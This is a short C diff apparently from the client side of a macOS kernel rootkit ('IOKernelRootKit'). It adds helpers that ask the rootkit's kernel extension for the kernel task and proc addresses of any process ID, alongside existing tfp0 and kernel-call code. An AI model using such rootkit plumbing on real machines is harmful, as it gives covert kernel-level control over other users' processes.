@@ -54,7 +54,7 @@ void close_kernel_tfp0_connection()
 	}
 }
 
-mach_port_t get_task_for_pid(int pid)
+mach_port_t _task_for_pid(int pid)
 {
 	kern_return_t kr;
 
@@ -570,6 +570,44 @@ uint64_t task_call(mach_port_t task_port, mach_vm_address_t symaddr, uint64_t *a
 	if(kr != KERN_SUCCESS)
 	{
 		return (uint64_t) -1;
+	}
+
+	return output[0];
+}
+
+mach_vm_address_t get_task_for_pid(int pid)
+{
+	kern_return_t kr;
+
+	uint64_t input[] = { (uint64_t) pid };
+	uint64_t output[] = { (uint64_t) 0 };
+
+	uint32_t outputCnt = 1;
+
+	kr = IOConnectCallMethod(connection, kIOKernelRootKitGetTaskForPid, input, 1, 0, 0, output, &outputCnt, 0, 0);
+
+	if(kr != KERN_SUCCESS)
+	{
+		return 0;
+	}
+
+	return output[0];
+}
+
+mach_vm_address_t get_proc_for_pid(int pid)
+{
+	kern_return_t kr;
+
+	uint64_t input[] = { (uint64_t) pid };
+	uint64_t output[] = { (uint64_t) 0 };
+
+	uint32_t outputCnt = 1;
+
+	kr = IOConnectCallMethod(connection, kIOKernelRootKitGetProcForPid, input, 1, 0, 0, output, &outputCnt, 0, 0);
+
+	if(kr != KERN_SUCCESS)
+	{
+		return 0;
 	}
 
 	return output[0];
